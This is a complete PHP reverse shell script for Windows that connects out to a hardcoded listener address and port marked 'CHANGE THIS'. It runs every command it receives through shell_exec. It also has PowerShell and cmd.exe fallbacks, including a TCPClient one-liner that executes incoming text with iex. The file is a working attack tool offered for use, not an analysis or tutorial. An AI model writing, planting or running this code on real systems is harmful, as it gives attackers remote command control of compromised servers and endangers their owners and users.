<?php
// Windows PHP Reverse Shell (CMD)
set_time_limit(0);
$ip = '192.168.133.187';  // CHANGE THIS
$port = 4545;         // CHANGE THIS

// Try different connection methods
function reverse_shell() {
    global $ip, $port;
    
    // Method 1: Direct socket connection (PHP)
    $sock = @fsockopen($ip, $port);
    if ($sock) {
        fwrite($sock, "Connected via PHP fsockopen()\n");
        while (!feof($sock)) {
            fwrite($sock, "C:\> ");
            $cmd = fgets($sock, 1024);
            $output = shell_exec($cmd);
            fwrite($sock, $output);
        }
        fclose($sock);
        return;
    }

    // Method 2: PowerShell fallback
    $ps = "powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1 | Out-String );\$o2=\$o+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$o2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\"";
    
    // Method 3: CMD fallback
    $cmd = "cmd.exe /c start /b powershell -c \"& {".$ps."}\"";
    
    // Execute most reliable method
    shell_exec($ps);
    shell_exec($cmd);
}

reverse_shell();
?>
